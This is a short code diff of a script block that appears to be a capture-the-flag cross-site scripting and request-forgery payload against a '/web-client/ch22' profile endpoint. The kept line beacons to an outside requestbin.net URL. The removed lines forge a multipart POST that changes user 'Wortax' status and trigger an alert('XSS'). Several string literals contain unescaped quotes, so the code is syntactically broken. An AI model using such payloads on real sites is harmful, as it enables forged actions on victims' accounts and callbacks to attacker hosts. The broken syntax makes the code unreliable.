@@ -2,26 +2,5 @@
 
 <script>
 fetch("https://requestbin.net/r/d7qr9vpc?i=2")
-  var xhr = new XMLHttpRequest();
-xhr.open("POST","/web-client/ch22/?action=profile",false)
-xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
-xhr.setRequestHeader("Accept-Language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
-xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryjBHsHajeWRJvz60y");
-var body =
-"----WebKitFormBoundaryjBHsHajeWRJvz60y\r\n" +
-"Content-Disposition: form-data; name="username"\r\n\n" +
-"Wortax\r\n"+
-"----WebKitFormBoundaryjBHsHajeWRJvz60y\r\n" +
-"Content-Disposition: form-data; name="status"\r\n\n" +
-"on\r\n"+
-"----WebKitFormBoundaryjBHsHajeWRJvz60y\r\n";
-
-
-  
-  if(xhr.send(body)){
-    alert('XSS')
-  }else{
-    alert('test')
-  }
-  
+ 
 </script>
